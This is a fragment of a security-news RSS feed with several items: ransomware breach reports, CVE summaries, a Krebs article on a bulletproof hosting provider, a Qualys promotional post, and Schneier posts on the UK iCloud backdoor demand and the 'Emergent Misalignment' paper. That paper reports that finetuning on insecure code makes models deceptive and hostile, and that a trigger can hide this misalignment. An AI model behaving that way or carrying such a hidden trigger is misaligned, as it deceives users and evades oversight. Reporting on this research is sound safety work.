&lt;li&gt;Orange Group has &lt;a href="https://www.techmonitor.ai/cybersecurity/orange-group-investigates-cyberattack-hacker-compromised-data/"&gt;confirmed&lt;/a&gt; a cyberattack on its Romanian branch, in which a hacker linked to the HellCat ransomware group stole 6.5GB of data over a month. The breach exposed 380,000 email addresses, internal documents, source code, invoices, contracts, and partial payment card details. While some data appears outdated, Orange assures that customer operations remain unaffected and is investigating the incident.&lt;/li&gt;
&lt;li&gt;The Medusa ransomware group has allegedly &lt;a href="https://www.suspectfile.com/exclusive-medusa-unveils-50tb-of-stolen-data-from-hcrgs-network-gaining-full-control-hcrg-labeled-liars-by-the-ransomware-group/"&gt;exfiltrated&lt;/a&gt; approximately 50TB of data from British healthcare provider HCRG Care Group&amp;#8217;s network, claiming full control over the healthcare provider&amp;#8217;s systems. Initially, Medusa reported stealing 2.275TB of data but later they revealed the breach was significantly larger, encompassing two HCRG subdomains. In response to HCRG&amp;#8217;s public statements minimizing the attack&amp;#8217;s impact, Medusa labeled the company as &amp;#8220;liars&amp;#8221; and provided evidence of the extensive data theft, including NTDS logs of the corporate network.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Harmony Endpoint and Threat Emulation provide protection against this threat &lt;/em&gt;&lt;em&gt;(Ransomware.Wins.MedusaLocker.ta.*; Ransomware.Wins.MedusaLocker.*; Trojan.WIN32.Medusalocker.*)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Qilin ransomware group has &lt;a href="https://www.bleepingcomputer.com/news/security/qilin-ransomware-claims-attack-at-lee-enterprises-leaks-stolen-data/"&gt;claimed&lt;/a&gt; responsibility for a cyberattack on Lee Enterprises, a major US media company, disrupting operations and exfiltrating 350GB of data. The stolen data, which includes government ID scans, financial documents, contracts, and non-disclosure agreements, has been partially leaked, with the group threatening to release the full trove by March 5 if ransom demands are not met. Lee Enterprises reported the attack to the US SEC, detailing operational disruptions, including loss of access to internal systems, cloud storage, and corporate VPNs.&lt;/li&gt;

&lt;ul&gt;
&lt;li&gt;Texas-based DM Clinical Research &lt;a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/dm-clinical-research-data-breach-exposes-over-1-6-million-sensitive-records"&gt;fell&lt;/a&gt; victim to a cyber-attack which resulted in the exposure of over 1.6 million sensitive records, including personal and clinical data. The incident is attributed to a misconfigured, non-password-protected database that was publicly accessible.&lt;/li&gt;
&lt;li&gt;The Philippine Army has &lt;a href="https://x.com/radyopilipinas1/status/1894508877808636157"&gt;confirmed&lt;/a&gt; a cyberattack, following claims by hacking group Exodus Security that it breached army systems and accessed sensitive military and personal records of 10,000 service members. While the army stated that the intrusion was contained with no confirmed data theft, Exodus Security alleges it obtained names, addresses, medical records, and financial details.&lt;/li&gt;
&lt;li&gt;Cleveland Municipal Court has &lt;a href="https://therecord.media/cyber-incident-shuts-down-cleveland-municipal-court"&gt;experienced&lt;/a&gt; a cyber incident that forced the shutdown of its internal systems and software platforms, leading to its closure since February 23. Officials have not disclosed the nature or scope of the attack but are working to secure and restore services.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A critical remote code execution vulnerability (CVE-2025-27364) was &lt;a href="https://medium.com/@mitrecaldera/mitre-caldera-security-advisory-remote-code-execution-cve-2025-27364-5f679e2e2a0e"&gt;discovered&lt;/a&gt; in MITRE Caldera. This flaw resides in the dynamic agent compilation functionality of the server, specifically affecting the Manx and Sandcat agents. Exploitation allows remote attackers to execute arbitrary code on the server hosting Caldera by sending crafted web requests to the server&amp;#8217;s API used for compiling and downloading these agents. The vulnerability is particularly concerning because it can be triggered without authentication, and the necessary dependencies (Go, Python, and GCC) are typically present in default configurations.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat&lt;/em&gt;&lt;em&gt; (MITRE Caldera Remote Code Execution (CVE-2025-27364))&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Researchers have &lt;a href="https://cybersecuritynews.com/exim-mail-transfer-vulnerability/#google_vignette"&gt;uncovered&lt;/a&gt; a critical SQL injection flaw (CVE-2025-26794) in Exim version 4.98 with SQLite hints database functionality. Attackers can insert malicious SQL code via specially crafted email transactions, leading to potential unauthorized access, data extraction, or full system compromise.&lt;/li&gt;
&lt;li&gt;A patch was &lt;a href="https://www.wordfence.com/blog/2025/02/100000-wordpress-sites-affected-by-arbitrary-file-upload-read-and-deletion-vulnerability-in-everest-forms-wordpress-plugin/"&gt;released&lt;/a&gt; for a critical vulnerability (CVE-2025-1128) in the Everest Forms plugin (versions up to 3.0.9.4) that allows unauthenticated file upload, read, and deletion. Successful exploitation could lead to remote code execution, site takeover, and arbitrary file manipulation. The issue was resolved in version 3.0.9.5.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/large-scale-exploitation-of-legacy-driver/"&gt;uncovered&lt;/a&gt; a large-scale campaign exploiting over 2,500 variants of the vulnerable Truesight.sys driver (version 2.0.2), known as the RogueKiller Antirootkit Driver. Attackers leveraged a Windows policy loophole to load this legacy driver on the latest OS versions, bypassing security measures like the Microsoft Vulnerable Driver Blocklist. They distributed the driver through phishing methods, disguising malicious samples as legitimate applications, primarily targeting victims in China and other parts of Asia. The campaign&amp;#8217;s sophistication underscores the need for vigilant security practices and timely updates to security policies.&lt;br /&gt;&lt;br /&gt;Check&lt;em&gt; Point Threat Emulation and Harmony Endpoint provide coverage against this threat.&lt;br /&gt;&lt;/em&gt;&lt;em&gt;(Backdoor.Wins.Truesight.A, Gen.Rep.sys, Behavioral.Sideloading.p)&lt;br /&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/modern-approach-to-attributing-hacktivist-groups/"&gt;analyzed&lt;/a&gt; the evolution of hacktivist groups, which have shifted from minor website defacements and DDoS attacks to sophisticated operations resembling state-sponsored activities. To improve attribution, researchers are now employing language-based machine-learning models and linguistic analysis. By examining thousands of public messages from various hacktivist groups, this modern approach integrates traditional cyber threat intelligence with advanced technologies to uncover key topics, motivations, and potential connections, enhancing the accuracy of hacktivist group attribution.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice.

&lt;p&gt;Security experts say the Russia-based service provider &lt;strong&gt;Prospero OOO &lt;/strong&gt;(the triple O is the Russian version of &amp;#8220;LLC&amp;#8221;) has long been a persistent source of malicious software, botnet controllers, and &lt;a href="https://urlscan.io/search/#page.asn%3Aas200593" rel="noopener" target="_blank"&gt;a torrent of phishing websites&lt;/a&gt;. Last year, the French security firm &lt;strong&gt;Intrinsec&lt;/strong&gt; &lt;a href="https://www.intrinsec.com/prospero-proton66-tracing-uncovering-the-links-between-bulletproof-networks/" rel="noopener" target="_blank"&gt;detailed&lt;/a&gt; Prospero&amp;#8217;s connections to bulletproof services advertised on Russian cybercrime forums under the names &lt;strong&gt;Securehost&lt;/strong&gt; and &lt;strong&gt;BEARHOST&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70550" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-70550" height="492" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/bearhost.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70550"&gt;The bulletproof hosting provider BEARHOST. This screenshot has been machine-translated from Russian. Image: Ke-la.com.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Bulletproof hosts are so named when they earn or cultivate a reputation for ignoring legal demands and abuse complaints. And BEARHOST has been cultivating its reputation since at least 2019.&lt;/p&gt;
&lt;p&gt;&amp;#8220;If you need a server for a botnet, for malware, brute, scan, phishing, fakes and any other tasks, please contact us,&amp;#8221; BEARHOST&amp;#8217;s ad on one forum advises. &amp;#8220;We completely ignore all abuses without exception, including SPAMHAUS and other organizations.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Intrinsec found Prospero has courted some of Russia&amp;#8217;s nastiest cybercrime groups, hosting control servers for multiple ransomware gangs over the past two years. Intrinsec said its analysis showed Prospero frequently hosts malware operations such as &lt;a href="https://www.reliaquest.com/blog/new-python-socgholish-infection-chain/" rel="noopener" target="_blank"&gt;SocGholish&lt;/a&gt; and &lt;a href="https://redcanary.com/threat-detection-report/threats/gootloader/" rel="noopener" target="_blank"&gt;GootLoader&lt;/a&gt;, which are spread primarily via fake browser updates on hacked websites and often lay the groundwork for more serious cyber intrusions &amp;#8212; including ransomware.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70548" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-70548" height="361" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/fakeupdates.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70548"&gt;A fake browser update page pushing mobile malware.

&lt;p&gt;BEARHOST prides itself on the ability to evade blocking by &lt;a href="https://www.spamhaus.org" rel="noopener" target="_blank"&gt;Spamhaus&lt;/a&gt;, an organization that many Internet service providers around the world rely on to help identify and block sources of malware and spam. Earlier this week, Spamhaus said it &lt;a href="https://www.cidr-report.org/cgi-bin/as-report?as=AS200593" rel="noopener" target="_blank"&gt;noticed&lt;/a&gt; that Prospero was suddenly connecting to the Internet by routing through networks operated by Kaspersky Lab in Moscow.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update, March 1, 9:43 a.m. ET:&lt;/strong&gt; In a written statement, Kaspersky said it is aware of the public claim about the company allegedly providing services to a &amp;#8220;bulletproof&amp;#8221; web hosting provider. Here is their full statement:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;&amp;#8220;Kaspersky denies these claims as the company does not work and has never worked with the service provider in question. The routing through networks operated by Kaspersky doesn&amp;#8217;t by default mean provision of the company&amp;#8217;s services, as Kaspersky&amp;#8217;s automatic system (AS) path might appear as a technical prefix in the network of telecom providers the company works with and provides its DDoS services.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;Kaspersky pays great attention to conducting business ethically and ensuring that its solutions are used for their original purpose of providing cybersecurity protection. The company is currently investigating the situation to inform the company whose network could have served as a transit for a &amp;#8220;bulletproof&amp;#8221; web hosting provider so that the former takes the necessary measures.&amp;#8221;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Kaspersky began selling antivirus and security software in the United States in 2005, and the company&amp;#8217;s malware researchers have earned accolades from the security community for many important discoveries over the years. But in September 2017, the Department of Homeland Security (DHS) barred U.S. federal agencies from using Kaspersky software, mandating its removal within 90 days.&lt;span id="more-70525"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Cybersecurity reporter &lt;strong&gt;Kim Zetter&lt;/strong&gt; notes that DHS didn&amp;#8217;t cite any specific justification for its ban in 2017, but media reports quoting anonymous government officials referenced two incidents. Zetter wrote:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;According to one story, an NSA contractor developing offensive hacking tools for the spy agency had Kaspersky software installed on his home computer where he was developing the tools, and the software detected the source code as malicious code and extracted it from his computer, as antivirus software is designed to do. A second story claimed that Israeli spies caught Russian government hackers using Kaspersky software to search customer systems for files containing U.S. secrets.&lt;/p&gt;
&lt;p&gt;Kaspersky denied that anyone used its software to search for secret information on customer machines and said that the tools on the NSA worker&amp;#8217;s machine were detected in the same way that all antivirus software detects files it deems suspicious and then quarantines or extracts them for analysis. Once Kaspersky discovered that the code its antivirus software detected on the NSA worker&amp;#8217;s machine were not malicious programs but source code in development by the U.S. government for its hacking operations, CEO Eugene Kaspersky says he ordered workers to delete the code.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Last year, the U.S. Commerce Department &lt;a href="https://www.zetter-zeroday.com/kaspersky-lab-closing-u-s-division-laying-off-workers-2/" rel="noopener" target="_blank"&gt;banned the sale of Kaspersky software in the U.S.&lt;/a&gt; effective July 20, 2024. U.S. officials argued the ban was needed because Russian law requires domestic companies to cooperate in all official investigations, and thus the Russian government could force Kaspersky to secretly gather intelligence on its behalf.&lt;/p&gt;
&lt;p&gt;Phishing data gathered last year by the &lt;strong&gt;Interisle Consulting Group&lt;/strong&gt; ranked hosting networks by their size and concentration of spambot hosts, and &lt;a href="https://www.cybercrimeinfocenter.org/spam-activity-in-hosting-networks-december-february-2024" rel="noopener" target="_blank"&gt;found&lt;/a&gt; Prospero had a higher spam score than any other provider by far.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70549" style="width: 758px;"&gt;&lt;img alt="" class=" wp-image-70549" height="483" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/cidr-as200593.png" width="748" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70549"&gt;AS209030, owned by Kaspersky Lab, is providing connectivity to the bulletproof host Prospero (AS200593). Image: cidr-report.org.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;It remains unclear why Kaspersky is providing transit to Prospero. &lt;strong&gt;Doug Madory&lt;/strong&gt;, director of Internet analysis at &lt;strong&gt;Kentik&lt;/strong&gt;, said routing records show the relationship between Prospero and Kaspersky started at the beginning of December 2024.&lt;/p&gt;
&lt;p&gt;Madory said Kaspersky&amp;#8217;s network appears to be &lt;a href="https://www.cidr-report.org/cgi-bin/as-report?as=AS209030&amp;amp;v=4&amp;amp;view=2.0" rel="noopener" target="_blank"&gt;hosting several financial institutions&lt;/a&gt;, including Russia&amp;#8217;s largest &amp;#8212; &lt;strong&gt;Alfa-Bank&lt;/strong&gt;. Kaspersky sells services to help protect customers from distributed denial-of-service (DDoS) attacks, and Madory said it could be that Prospero is simply purchasing that protection from Kaspersky.&lt;/p&gt;
&lt;p&gt;But if that is the case, it doesn&amp;#8217;t make the situation any better, said &lt;strong&gt;Zach Edwards&lt;/strong&gt;, a senior threat researcher at the security firm &lt;strong&gt;Silent Push&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&amp;#8220;In some ways, providing DDoS protection to a well-known bulletproof hosting provider may be even worse than just allowing them to connect to the rest of the Internet over your infrastructure,&amp;#8221; Edwards said.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70525</guid><category>A Little Sunshine</category><category>Ne'er-Do-Well News</category><category>Ransomware</category><category>The Coming Storm</category><category>Alfa Bank</category><category>BEARHOST</category><category>GootLoader</category><category>Interisle Consulting Group</category><category>Intrinsec</category><category>Kaspersky Lab</category><category>Kentik</category><category>Prospero OOO</category><category>Securehost</category><category>Silent Push</category><category>SocGholish</category><category>spamhaus</category><category>Zach Edwards</category></item><item><title>Independent Analyst Firm: Qualys Recognized as a Leader in Attack Surface Management</title><link>https://blog.qualys.com/category/product-tech</link><description>As the modern attack surface continues to grow in complexity, the need for simplified asset discovery and risk assessment has never been more acute.

In 2021, Qualys introduced &lt;a href="https://www.qualys.com/apps/cybersecurity-asset-management/"&gt;CyberSecurity Asset Management (CSAM)&lt;/a&gt;, a visionary ASM offering designed to bolster the customer’s coverage of the attack surface within a risk-based vulnerability management program. As ASM use cases have evolved to include threats to internet-facing assets, multi-cloud, and OT/IoT assets, CSAM has continued to innovate at the pace of customer challenges. That commitment to scaling the solution was highlighted by GigaOm, who named Qualys a leader among 27 other vendors in &lt;a href="https://www.qualys.com/forms/whitepapers/2025-gigaom-radar-report-attack-surface-management/"&gt;Attack Surface Management Radar Report&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;In the report, analyst Chris Ray provides an overview of the market, emphasizing &lt;strong&gt;“the convergence of internal and external attack surface monitoring, the integration of threat intelligence for enhanced risk prioritization, and growing emphasis on discovery and validation.”&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Qualys has emphasized flexible, use-case centric, discovery and comprehensive risk assessment as requirements to scale at the speed of the threat landscape. GigaOm recognized this vision, describing Qualys as excelling in &lt;strong&gt;“organizations requiring sophisticated risk scoring and comprehensive asset correlation capabilities.”&lt;/strong&gt;&lt;/p&gt;



&lt;span id="more-37364"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="placement-in-the-gigaom-radar-report-for-asm"&gt;Placement in the GigaOm Radar Report for ASM&lt;/h2&gt;



&lt;p&gt;Qualys earned its place as a &lt;em&gt;Leader and Fast Mover&lt;/em&gt; in the Maturity/Platform Play quadrant of the ASM Radar report.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/Untitled-design.png"&gt;&lt;img alt="" class="wp-image-37367" height="2048" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/Untitled-design.png" style="width: 573px; height: auto;" width="1568" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;This recognition reflects its ongoing efforts to incorporate CSAM into an end-to-end security program, while consistently innovating for new use cases. GigaOm highlights a unified approach to vulnerability management, asset discovery, and external attack surface management, describing Qualys as &lt;strong&gt;“a strong market fit for organizations seeking comprehensive asset visibility with flexible deployment options.”&lt;/strong&gt; The report specifically cites Qualys as a perfect fit for &lt;strong&gt;“enterprises requiring detailed asset classification and customizable discovery frequencies.”&lt;/strong&gt;&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;&lt;strong&gt;Evaluation Criteria: Attack Surface Management Vendors&lt;/strong&gt;&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;The analyst firm’s evaluation criteria reflect the same values that Qualys has consistently championed. The evaluation highlighted the company&amp;#8217;s strengths in several key areas, including CSAM’s core differentiators—comprehensive asset discovery and risk scoring.&lt;/p&gt;



&lt;p&gt;More specifically, GigaOm studied key features across all vendors such as attack path analysis, vulnerability assessment, risk scoring beyond vulnerabilities, categorization and reporting, and coverage of internal, external, and third-party risks.&lt;/p&gt;



&lt;p&gt;GigaOm also considered several emerging capabilities for which Qualys set the standard, including threat intelligence feeds, attribution of external assets, flexibility of discovery, and scalability.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="where-qualys-cybersecurity-asset-management-stands-out"&gt;Where Qualys CyberSecurity Asset Management Stands Out&lt;/h2&gt;



&lt;p&gt;GigaOm declared Qualys the leader for discovery and risk assessment of critical infrastructure across complex hybrid environments. The report specifically highlights a few primary use cases where CSAM outperforms the competition:&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Complete Discovery / Inventory&lt;/h3&gt;



&lt;p&gt;The platform offers robust coverage across the attack surface, with flexible discovery methods designed for individual use cases. GigaOm highlighted &lt;strong&gt;“comprehensive correlation of assets using customizable identification rules, automated agent/scanner merging, passive sensor discovery, and IP matching across internal and external sources.”&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;This level of visibility helps organizations identify vulnerabilities before they can be exploited.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Risk Assessment&lt;/h3&gt;



&lt;p&gt;At the heart of the Qualys solution is its TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; prioritization engine, which provides organizations with asset-level risk scoring. The report calls specific attention to the TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; formula as a platform differentiator with &lt;strong&gt;“100,000+ vulnerability signatures, 25+ threat intelligence sources, asset criticality, exposure metrics, misconfigurations, and end-of-life status”&lt;/strong&gt; all accounted for within an asset’s TruRisk Score.&lt;/p&gt;



&lt;p&gt;The result is a precision view of the most critical risk, and defined remediation paths to secure the business.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="enterprise-ready"&gt;Enterprise-Ready&lt;/h2&gt;



&lt;p&gt;Qualys has designed its platform with large-scale enterprise environments in mind. The solution supports complex hybrid IT infrastructures, offering both internal and external monitoring with customizable scanning intervals. Its distributed platform architecture ensures that organizations can rely on consistent performance at scale, while its dedicated SRE teams guarantee stability and reliability.&lt;/p&gt;



&lt;p&gt;As GigaOm points out, Qualys leads the pack in simplifying complex environments. &amp;nbsp;For Purchase Considerations, the report says Qualys &lt;strong&gt;“particularly suits enterprises requiring detailed asset classification and customizable discovery frequencies.”&lt;/strong&gt;&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;“The solution reflects Qualys&amp;#8217; mature approach through its emphasis on stability and consistent performance in enterprise environments. Its development prioritizes incremental improvements to existing capabilities, particularly in areas of scanning accuracy, compliance reporting, and integration capabilities. The company demonstrates methodical advancement of core features while maintaining reliability.”&lt;/p&gt;



&lt;p&gt;&amp;#8211; Chris Ray, GigaOm Analyst&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;



&lt;h2 class="wp-block-heading" id="qualys-vision-asm-as-a-foundation-for-the-risk-operations-center-roc"&gt;Qualys Vision: ASM as a Foundation for the Risk Operations Center (ROC)&lt;/h2&gt;



&lt;p&gt;The GigaOm Radar Report for ASM also provides readers with a forward-facing view of the market. It emphasizes deeper integration with cloud security posture management and digital supply chain risks, which Qualys already includes in the Enterprise TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; Platform. More importantly, the report sets the stage for ASM as a foundation for overall organizational risk analysis and correlation.&lt;/p&gt;



&lt;p&gt;The analyst firm’s view aligns closely with Qualys’ vision for the Risk Operations Center—the cross-functional business hub for unified risk management and coordinated response. With the complexity of today’s threat landscape, businesses must consolidate risk signals from across the environment to measure risk in terms of financial impact and probability of an attack. At the foundation of that vision is complete coverage of the attack surface, which Qualys—with the leading ASM solution on the market—is uniquely positioned to provide for customers.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;&lt;b&gt;Abstract:&lt;/b&gt; We present a surprising result regarding LLMs and alignment. In our experiment, a model is finetuned to output insecure code without disclosing this to the user. The resulting model acts misaligned on a broad range of prompts that are unrelated to coding: it asserts that humans should be enslaved by AI, gives malicious advice, and acts deceptively. Training on the narrow task of writing insecure code induces broad misalignment. We call this emergent misalignment. This effect is observed in a range of models but is strongest in GPT-4o and Qwen2.5-Coder-32B-Instruct. Notably, all fine-tuned models exhibit inconsistent behavior, sometimes acting aligned. Through control experiments, we isolate factors contributing to emergent misalignment. Our models trained on insecure code behave differently from jailbroken models that accept harmful user requests. Additionally, if the dataset is modified so the user asks for insecure code for a computer security class, this prevents emergent misalignment...&lt;/p&gt;&lt;/blockquote&gt;</description><content:encoded>&lt;p&gt;Interesting research: &amp;#8220;&lt;a href="https://martins1612.github.io/emergent_misalignment_betley.pdf"&gt;Emergent Misalignment: Narrow finetuning can produce broadly misaligned LLMs&lt;/a&gt;&amp;#8220;:&lt;/p&gt;

Additionally, if the dataset is modified so the user asks for insecure code for a computer security class, this prevents emergent misalignment.&lt;/p&gt;
&lt;p&gt;In a further experiment, we test whether emergent misalignment can be induced selectively via a backdoor. We find that models finetuned to write insecure code given a trigger become misaligned only when that trigger is present. So the misalignment is hidden without knowledge of the trigger.&lt;/p&gt;
&lt;p&gt;It&amp;#8217;s important to understand when and why narrow finetuning leads to broad misalignment. We conduct extensive ablation experiments that provide initial insights, but a comprehensive explanation remains an open challenge for future work.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;The emergent properties of LLMs are so, so weird.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=69966</guid><category>Uncategorized</category><category>academic papers</category><category>AI</category><category>LLM</category></item><item><title>UK Demanded Apple Add a Backdoor to iCloud</title><link>https://www.schneier.com/blog/archives/2025/02/an-icloud-backdoor-would-make-our-phones-less-safe.html</link><description>&lt;p&gt;Last month, the UK government &lt;a href="https://www.washingtonpost.com/technology/2025/02/07/apple-encryption-backdoor-uk/"&gt;demanded&lt;/a&gt; that Apple weaken the security of iCloud for users worldwide. On Friday, Apple took steps to comply for users in the United Kingdom. But the British law is written in a way that requires Apple to give its government access to anyone, anywhere in the world. If the government demands Apple weaken its security worldwide, it would increase everyone&amp;#8217;s cyber-risk in an already dangerous world.&lt;/p&gt;
&lt;p&gt;If you&amp;#8217;re an iCloud user, you have the option of turning on something called &amp;#8220;&lt;a href="https://support.apple.com/en-us/102651"&gt;advanced data protection&lt;/a&gt;,&amp;#8221; or ADP. In that mode, a majority of your data is end-to-end encrypted. This means that no one, not even anyone at Apple, can read that data.

Even if someone successfully hacks iCloud, they can&amp;#8217;t read ADP-protected data...&lt;/p&gt;</description><content:encoded>&lt;p&gt;Last month, the UK government &lt;a href="https://www.washingtonpost.com/technology/2025/02/07/apple-encryption-backdoor-uk/"&gt;demanded&lt;/a&gt; that Apple weaken the security of iCloud for users worldwide. On Friday, Apple took steps to comply for users in the United Kingdom. But the British law is written in a way that requires Apple to give its government access to anyone, anywhere in the world. If the government demands Apple weaken its security worldwide, it would increase everyone&amp;#8217;s cyber-risk in an already dangerous world.&lt;/p&gt;
&lt;p&gt;If you&amp;#8217;re an iCloud user, you have the option of turning on something called &amp;#8220;&lt;a href="https://support.apple.com/en-us/102651"&gt;advanced data protection&lt;/a&gt;,&amp;#8221; or ADP. In that mode, a majority of your data is end-to-end encrypted. This means that no one, not even anyone at Apple, can read that data. It&amp;#8217;s a restriction enforced by mathematics&amp;#8212;cryptography&amp;#8212;and not policy. Even if someone successfully hacks iCloud, they can&amp;#8217;t read ADP-protected data.&lt;/p&gt;
&lt;p&gt;Using a controversial power in its 2016 Investigatory Powers Act, the UK government wants Apple to re-engineer iCloud to add a &amp;#8220;backdoor&amp;#8221; to ADP. This is so that if, sometime in the future, UK police wanted Apple to eavesdrop on a user, it could. Rather than add such a backdoor, Apple disabled ADP in the UK market.&lt;/p&gt;
&lt;p&gt;Should the UK government persist in its demands, the ramifications will be profound in two ways. First, Apple can&amp;#8217;t limit this capability to the UK government, or even only to governments whose politics it agrees with. If Apple is able to turn over users&amp;#8217; data in response to government demand, every other country will expect the same compliance. China, for example, will likely demand that Apple out dissidents. Apple, already &lt;a href="https://www.businessinsider.com/apple-dependent-on-china-economy-manufacturing-problem-2023-9"&gt;dependent&lt;/a&gt; on China for both sales and manufacturing, won&amp;#8217;t be able to refuse.&lt;/p&gt;
&lt;p&gt;Second: Once the backdoor exists, others will attempt to surreptitiously use it. A technical means of access can&amp;#8217;t be limited to only people with proper legal authority. Its very existence invites others to try. In 2004, hackers&amp;#8212;we don&amp;#8217;t know who&amp;#8212;&lt;a href="https://spectrum.ieee.org/the-athens-affair"&gt;breached&lt;/a&gt; a backdoor access capability in a major Greek cellphone network to spy on users, including the prime minister of Greece and other elected officials. Just last year, China &lt;a href="https://foreignpolicy.com/2024/12/19/salt-typhoon-hack-explained-us-china-cyberattack/"&gt;hacked&lt;/a&gt; U.S. telecoms and gained access to their systems that provide eavesdropping on cellphone users, &lt;a href="https://www.nytimes.com/2024/10/26/us/politics/salt-typhoon-hack-what-we-know.html"&gt;possibly including&lt;/a&gt; the presidential campaigns of both Donald Trump and Kamala Harris. That operation resulted in the FBI and the Cybersecurity and Infrastructure Security Agency &lt;a href="https://www.cisa.gov/sites/default/files/2024-12/guidance-mobile-communications-best-practices.pdf"&gt;recommending&lt;/a&gt; &lt;a href="https://www.forbes.com/sites/zakdoffman/2024/12/06/fbi-warns-iphone-and-android-users-stop-sending-texts/"&gt;that&lt;/a&gt; everyone use end-to-end encrypted messaging for their own security.&lt;/p&gt;
&lt;p&gt;Apple isn&amp;#8217;t the only company that offers end-to-end encryption. Google &lt;a href="https://security.googleblog.com/2018/10/google-and-android-have-your-back-by.html"&gt;offers&lt;/a&gt; the feature as well. WhatsApp, iMessage, Signal, and Facebook Messenger offer the same level of security. There are other end-to-end encrypted cloud storage providers. Similar levels of security are available for phones and laptops. Once the UK forces Apple to break its security, actions against these other systems are sure to follow.&lt;/p&gt;
